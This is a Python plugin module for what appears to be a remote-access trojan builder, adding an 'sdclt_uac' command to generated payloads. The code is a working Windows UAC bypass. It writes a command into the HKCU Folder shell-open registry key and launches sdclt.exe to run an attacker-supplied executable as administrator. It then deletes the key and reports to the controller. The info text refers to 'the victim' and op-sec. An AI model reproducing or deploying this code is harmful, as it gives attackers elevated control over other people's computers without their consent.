# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import winreg')
        self.config.import_statements.append('from os import path, startfile')
        self.config.import_statements.append('from time import sleep')
        self.config.functions.append('''
def sdclt_uac(data):
    filepath = data.split(' ',1)[1]
    if path.isfile(filepath):
        reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
        key = winreg.CreateKeyEx(reg,'Software\\Classes\\Folder\\shell\open\\command',0,winreg.KEY_WRITE)
        winreg.SetValueEx(key, '',0,winreg.REG_SZ, 'cmd.exe /c "' + filepath + '"')
        winreg.FlushKey(key)
        winreg.SetValueEx(key, 'DelegateExecute',0,winreg.REG_SZ, '')
        winreg.FlushKey(key)
        winreg.CloseKey(key)
        winreg.CloseKey(reg)
        startfile('C:\\WINDOWS\\system32\\sdclt.exe')
        sleep(2)
        winreg.DeleteKey(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\Folder\\shell\open'), 'command')
        send_all(s,'[+]Attempted to get executable to bypass UAC through sdclt.exe')
    else:
        send_all(s,'[-]Executable remote filepath does not exist')
''')
        self.config.logics.append('''
            elif command == "sdclt_uac":
                sdclt_uac(data)''')
        self.config.help_menu['sdclt_uac <full remote filepath>'] = 'Bypasses UAC by using the sdclt.exe process'
    elif option == 'info':
        self.log.blank('\nName             : SDCLT UAC Bypass' \
                       '\nOS               : Windows 7 and above' \
                       '\nRequired Modules : winreg, os, time' \
                       '\nCommands         : sdclt_uac <full remote filepath>' \
                       '\nDescription      : This module takes advantage of the sdclt.exe\'s auto elevation to run executables (.exe only) as admin processes, bypassing UAC permission' \
                       '\nNote             : This module no longer works on the latest Windows 10 version :( is NOT op-sec safe. A blank command prompt window is opened and remains open' \
                       '\n                   until the victim closes it, however the elevated process continues running. UAC notification also cannot be set to "always notify" or the user can deny the elevation\n')
        return {
                "Name": "SDCLT UAC Bypass",
                "OS": "Windows",
                "Required Modules": "winreg, os, time",
                "Commands": "sdclt_uac <full remote filepath>",
                "Description": "This module takes advantage of the sdclt.exe\'s auto elevation to run executables (.exe only) as admin processes, bypassing UAC permission"}